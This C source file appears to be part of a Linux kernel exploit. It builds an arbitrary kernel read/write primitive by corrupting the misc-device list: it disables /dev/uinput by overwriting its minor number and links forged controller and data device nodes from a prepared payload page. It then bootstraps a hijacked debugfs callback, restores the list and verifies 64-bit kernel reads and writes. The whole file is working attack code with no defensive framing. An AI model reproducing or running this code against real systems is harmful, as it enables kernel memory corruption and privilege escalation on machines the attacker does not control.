#include "common.h"

enum { ATTR_FD_CONTROLLER = 0, ATTR_FD_DATA = 1 };
/* Carrier descriptors: [0] controller, [1] data. */
int attr_fd[2] = {-1, -1};
int attr_list_restored;

/* Step 1/3 check: the uinput disable write must have landed. */
int attr_verify(void) {
  errno = 0;
  int fd = open(UINPUT_DEVICE, O_RDWR | O_CLOEXEC);
  if (fd >= 0) {
    close(fd);
    pr_warning("step 1/3 FAIL: /dev/uinput still opens (write miss)\n");
    return 0;
  }
  pr_debug("step 1/3 probe: ENODEV errno=%d (write fired)\n", errno);
  return errno == ENODEV;
}

static int attr_write_number(int fd, uint64_t value, const char* label) {
  char text[32];
  int len = snprintf(text, sizeof(text), "0x%llx\n", (unsigned long long)value);
  if (len <= 0 || len >= (int)sizeof(text)) {
    errno = EOVERFLOW;
    return 0;
  }
  errno = 0;
  ssize_t written = write(fd, text, (size_t)len);
  if (written != len) {
    pr_warning(
        "R/W write failed label=%s fd=%d value=%016llx "
        "ret=%zd/%d errno=%d\n",
        label, fd, (unsigned long long)value, written, len, errno);
    return 0;
  }
  return 1;
}

static int attr_set_target(uintptr_t target) {
  if (attr_fd[ATTR_FD_CONTROLLER] < 0 || !is_kernel_ptr(target)) {
    errno = EINVAL;
    return 0;
  }
  return attr_write_number(attr_fd[ATTR_FD_CONTROLLER], target, "controller.target");
}

/* Single-kernel-word write via the data fd. */
int attr_write64(uintptr_t target, uint64_t value) {
  return attr_set_target(target) && attr_write_number(attr_fd[ATTR_FD_DATA], value, "data.value");
}

int attr_read64(uintptr_t target, uint64_t* value) {
  if (!value || !attr_set_target(target)) {
    return 0;
  }
  if (lseek(attr_fd[ATTR_FD_DATA], 0, SEEK_SET) != 0) {
    pr_warning("R/W: data lseek failed target=%016zx errno=%d\n", target, errno);
    return 0;
  }
  char text[32];
  errno = 0;
  ssize_t got = read(attr_fd[ATTR_FD_DATA], text, sizeof(text) - 1);
  if (got <= 0 || got >= (ssize_t)sizeof(text)) {
    pr_warning("R/W read failed target=%016zx ret=%zd errno=%d\n", target, got, errno);
    return 0;
  }
  text[got] = 0;
  char* end = NULL;
  errno = 0;
  unsigned long long parsed = strtoull(text, &end, 0);
  if (errno || end == text || (*end && *end != '\n')) {
    pr_warning("R/W parse failed target=%016zx text='%s' errno=%d\n", target, text, errno);
    return 0;
  }
  *value = (uint64_t)parsed;
  return 1;
}

int attr_read_data(uintptr_t target, void* data, size_t len) {
  if (!data || !len || !is_kernel_ptr(target)) {
    errno = EINVAL;
    return 0;
  }
  unsigned char* out = data;
  for (size_t done = 0; done < len;) {
    uint64_t word = 0;
    size_t chunk = len - done < sizeof(word) ? len - done : sizeof(word);
    if (!attr_read64(target + done, &word)) {
      return 0;
    }
    memcpy(out + done, &word, chunk);
    done += chunk;
  }
  return 1;
}

int attr_write_data(uintptr_t target, const void* data, size_t len) {
  if (!data || !len || !is_kernel_ptr(target)) {
    errno = EINVAL;
    return 0;
  }
  const unsigned char* in = data;
  for (size_t done = 0; done < len;) {
    uint64_t word = 0;
    size_t chunk = len - done < sizeof(word) ? len - done : sizeof(word);
    if (chunk != sizeof(word) && !attr_read64(target + done, &word)) {
      return 0;
    }
    memcpy(&word, in + done, chunk);
    if (!attr_write64(target + done, word)) {
      return 0;
    }
    done += chunk;
  }
  return 1;
}

static uintptr_t attr_find_uinput_successor(uintptr_t head, uintptr_t uinput_list) {
  uint64_t node = 0;
  if (!attr_read64(head + sizeof(uint64_t), &node)) {
    return 0;
  }
  for (int i = 0; i < 4096; i++) {
    if (node == head || !is_kernel_ptr((uintptr_t)node) || (node & 7)) {
      break;
    }
    uint64_t prev = 0;
    if (!attr_read64((uintptr_t)node + sizeof(uint64_t), &prev)) {
      return 0;
    }
    if (prev == uinput_list) {
      pr_debug("restore: uinput successor=%016llx (reverse walk iters=%d)\n",
               (unsigned long long)node, i + 1);
      return (uintptr_t)node;
    }
    node = prev;
  }
  pr_warning("restore: could not recover original uinput successor\n");
  return 0;
}

static int attr_restore_uinput(uintptr_t head, uintptr_t uinput) {
  uintptr_t uinput_list = uinput + MISC_STRUCT_LIST_OFF;
  uintptr_t successor = attr_find_uinput_successor(head, uinput_list);
  if (!successor) {
    return 0;
  }

  uint64_t original_minor = UINPUT_MINOR;
  if (!attr_write64(uinput_list, successor) ||
      !attr_write64(successor + sizeof(uint64_t), uinput_list) ||
      !attr_write64(uinput + MISC_STRUCT_MINOR_OFF, original_minor)) {
    return 0;
  }

  uint64_t next_after = 0;
  uint64_t prev_after = 0;
  uint64_t minor_after = UINT64_MAX;
  if (!attr_read64(uinput_list, &next_after) ||
      !attr_read64(successor + sizeof(uint64_t), &prev_after) ||
      !attr_read64(uinput + MISC_STRUCT_MINOR_OFF, &minor_after) || next_after != successor ||
      prev_after != uinput_list || minor_after != original_minor) {
    pr_warning(
        "restore: verify failed next=%016llx/%016zx "
        "prev=%016llx/%016zx minor=%016llx/%016llx\n",
        (unsigned long long)next_after, successor, (unsigned long long)prev_after, uinput_list,
        (unsigned long long)minor_after, (unsigned long long)original_minor);
    return 0;
  }
  attr_list_restored = 1;
  pr_success("restore OK: uinput minor=%u\n", UINPUT_MINOR);
  pr_debug("restore: uinput=%016zx successor=%016zx\n", uinput, successor);
  return 1;
}

static uintptr_t attr_fresh_payload(void) {
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) {
    pr_warning("R/W: workspace preparation failed\n");
    return 0;
  }

  return page_base + SKB_DATA_DELTA;
}

static int attr_walk_ok(int rc, const char* step) {
  if (rc >= 1) {
    return 1;
  }
  pr_warning("walk %s rc=%d%s\n", step, rc,
             rc < 0 ? " (EARLY/hung: reboot recommended)" : " (miss, write not delivered)");
  return 0;
}

/* Attach the carrier: disable uinput, link controller + data nodes. */
int attr_run(void) {
  attr_fd[ATTR_FD_CONTROLLER] = -1;
  attr_fd[ATTR_FD_DATA] = -1;
  attr_list_restored = 0;

  int probe = open(UINPUT_DEVICE, O_RDWR | O_CLOEXEC);
  if (probe < 0) {
    pr_warning("preflight: cannot open %s errno=%d\n", UINPUT_DEVICE, errno);
    return 0;
  }
  close(probe);

  uintptr_t head = text_addr(MISC_LIST);
  uintptr_t uinput = text_addr(UINPUT_MISC);
  uintptr_t uinput_list = uinput + MISC_STRUCT_LIST_OFF;

  uintptr_t payload_base = 0;
  uintptr_t step0_value = 0;
  int rc0 = 0;
  for (int r = 0; r < ATTR_STEP_RETRIES && rc0 == 0; r++) {
    payload_base = attr_fresh_payload();
    if (!payload_base) return 0;
    step0_value = payload_base + ATTR_W1_SCRATCH_OFF;
    if ((uint32_t)step0_value == UINPUT_MINOR) continue;
    if (r) pr_info("step 1/3: miss retry %d/%d\n", r, ATTR_STEP_RETRIES);
    rc0 = pselect_write_once(uinput + MISC_STRUCT_MINOR_OFF, step0_value, 0);
  }
  if (rc0 == 0) {
    pr_warning("step 1/3: walk miss (write not delivered)\n");
    return 0;
  }
  pr_info("targets resolved: misc_list=%016zx uinput=%016zx scratch=%016zx\n", head, uinput,
          step0_value);
  pr_debug("step 1/3 walk rc=%d\n", rc0);
  if (!attr_verify()) {
    pr_warning("step 1/3: disable-minor effect probe failed\n");
    return 0;
  }
  pr_success("step 1/3 OK: real uinput disabled\n");

  uintptr_t controller = 0, data = 0, data_list = 0, proof_scratch = 0;
  int rc1 = 0;
  for (int r = 0; r < ATTR_STEP_RETRIES && rc1 == 0; r++) {
    payload_base = attr_fresh_payload();
    if (!payload_base) return 0;
    controller = payload_base + ATTR_CONTROLLER_OFF;
    data = payload_base + ATTR_DATA_OFF;
    data_list = data + MISC_STRUCT_LIST_OFF;
    proof_scratch = payload_base + ATTR_W1_SCRATCH_OFF;
    if (r) pr_info("step 2/3: miss retry %d/%d\n", r, ATTR_STEP_RETRIES);
    pr_info("step 2/3: controller=%016zx data=%016zx\n", controller, data);
    rc1 = pselect_write_once(uinput_list, controller + MISC_STRUCT_LIST_OFF, 1);
  }
  if (!attr_walk_ok(rc1, "2/3")) return 0;
  pr_debug("step 2/3: walk done, opening /dev/uinput...\n");
  attr_fd[ATTR_FD_CONTROLLER] = open(UINPUT_DEVICE, O_RDWR | O_CLOEXEC);
  pr_debug("step 2/3: open returned fd=%d errno=%d\n", attr_fd[ATTR_FD_CONTROLLER], errno);
  if (attr_fd[ATTR_FD_CONTROLLER] < 0) {
    pr_warning("step 2/3: controller open failed errno=%d\n", errno);
    return 0;
  }
  pr_success("step 2/3 OK: controller fd=%d\n", attr_fd[ATTR_FD_CONTROLLER]);

  int rc2 = 0;
  for (int r = 0; r < ATTR_STEP_RETRIES && rc2 == 0; r++) {
    payload_base = attr_fresh_payload();
    if (!payload_base) return 0;
    if (r) pr_info("step 3/3: miss retry %d/%d\n", r, ATTR_STEP_RETRIES);
    pr_info("step 3/3: linking data node=%016zx\n", data_list);
    pr_debug("step 3/3: walk page=%016zx\n", payload_base);
    rc2 = pselect_write_once(uinput_list, data_list, 2);
  }
  if (!attr_walk_ok(rc2, "3/3")) return 0;
  attr_fd[ATTR_FD_DATA] = open(UINPUT_DEVICE, O_RDWR | O_CLOEXEC);
  if (attr_fd[ATTR_FD_DATA] < 0) {
    pr_warning("step 3/3: data open failed errno=%d\n", errno);
    return 0;
  }
  pr_success("step 3/3 OK: data fd=%d\n", attr_fd[ATTR_FD_DATA]);

  if (!attr_write64(data + ATTR_GET_OFF, text_addr(DEBUGFS_U64_GET))) {
    pr_warning("R/W: get callback bootstrap failed\n");
    return 0;
  }

  if (!attr_restore_uinput(head, uinput)) {
    pr_warning("restore: misc list restore failed (reboot keeper required)\n");
    return 0;
  }

  uintptr_t proof_target = proof_scratch + 0x20;
  uint64_t proof_before = 0;
  uint64_t proof_after = 0;
  const uint64_t proof_value = 0x4d33515f41545452ULL;
  int proof_ok = attr_read64(proof_target, &proof_before) &&
                 attr_write64(proof_target, proof_value) &&
                 attr_read64(proof_target, &proof_after) && proof_after == proof_value &&
                 attr_write64(proof_target, proof_before);
  pr_debug("proof: target=%016zx before=%016llx after=%016llx ok=%d\n", proof_target,
           (unsigned long long)proof_before, (unsigned long long)proof_after, proof_ok);

  int result = proof_ok && attr_list_restored;
  pr_success(
      "R/W primitive ready: controller_fd=%d data_fd=%d "
      "restore=%d proof=%d\n",
      attr_fd[ATTR_FD_CONTROLLER], attr_fd[ATTR_FD_DATA], attr_list_restored, proof_ok);
  return result;
}

uint64_t attr_read64_value(uintptr_t target) {
  uint64_t v = 0;
  return attr_read64(target, &v) ? v : 0;
}
